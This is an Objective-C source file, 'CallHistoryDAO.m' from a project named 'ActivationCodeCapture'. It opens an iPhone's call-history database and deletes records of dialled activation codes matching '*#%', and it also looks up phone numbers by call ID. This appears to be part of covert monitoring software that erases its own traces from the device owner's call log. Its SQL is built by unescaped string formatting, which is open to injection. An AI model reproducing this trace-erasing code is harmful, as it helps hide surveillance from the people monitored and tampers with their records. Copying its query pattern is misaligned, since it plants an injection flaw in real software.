//
//  CallHistoryDAO.m
//  ActivationCodeCapture
//
//  Created by Makara Khloth on 11/24/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <UIKit/UIKit.h>

#import "CallHistoryDAO.h"
#import "DefStd.h"

#import "FMDatabase.h"

static NSString* const kDeleteFromCallHistoryWhereAddress			= @"DELETE FROM call WHERE address = '%@'";
static NSString* const kDeleteFromCallHistoryWhereAddressiOS8       = @"DELETE FROM ZCALLRECORD WHERE ZADDRESS = '%@'";
static NSString* const kDeleteFromCallHistoryWhereAddressSubString	= @"DELETE FROM call WHERE address LIKE '*#%'";
static NSString* const kDeleteFromCallHistoryWhereAddressSubStringiOS8	= @"DELETE FROM ZCALLRECORD WHERE ZADDRESS LIKE '*#%'";

static NSString	* const kSelectCallUUID                             = @"SELECT ZADDRESS FROM ZCALLRECORD WHERE ZUNIQUE_ID ='%@'";

@implementation CallHistoryDAO

- (id) init {
	if ((self = [super init])) {
        if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
            mCallHistoryDatabase = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
        } else {
            mCallHistoryDatabase = [FMDatabase databaseWithPath:kCallHistoryDatabasePathiOS8];
        }
        
		[mCallHistoryDatabase retain];
		[mCallHistoryDatabase open];
	}
	return (self);
}

- (BOOL) scanAndDeleteAllActivationCode {
    NSString* sqlStatement = nil;
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
        sqlStatement = kDeleteFromCallHistoryWhereAddressSubString;
    } else {
        sqlStatement = kDeleteFromCallHistoryWhereAddressSubStringiOS8;
    }
	BOOL success = [mCallHistoryDatabase executeUpdate:sqlStatement];
	return (success);
}

- (BOOL) deleteActivationCode: (NSString*) aActivationCode {
    NSString* sqlStatement = nil;
    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
        sqlStatement = [NSString stringWithFormat:kDeleteFromCallHistoryWhereAddress, aActivationCode];
    } else {
        sqlStatement = [NSString stringWithFormat:kDeleteFromCallHistoryWhereAddressiOS8, aActivationCode];
    }
	BOOL success = [mCallHistoryDatabase executeUpdate:sqlStatement];
    DLog(@"Call db last error, %@, %d", [mCallHistoryDatabase lastErrorMessage], [mCallHistoryDatabase lastErrorCode]);
	return (success);
}

- (NSString*) telNumberForUUID: (NSString *) aUUID {
    NSString *telNumber = nil;
    if (aUUID) {
        NSString *sql = [NSString stringWithFormat:kSelectCallUUID, aUUID];
        DLog(@"sql %@", sql)
        FMResultSet* resultSet = [mCallHistoryDatabase executeQuery:sql];
        while ([resultSet next]) {
            telNumber = [resultSet stringForColumnIndex:0];
            DLog (@"tel number:%@", telNumber);
        }
    }
    return telNumber;
}

- (void) dealloc {
	[mCallHistoryDatabase close];
	[mCallHistoryDatabase release];
	[super dealloc];
}

@end
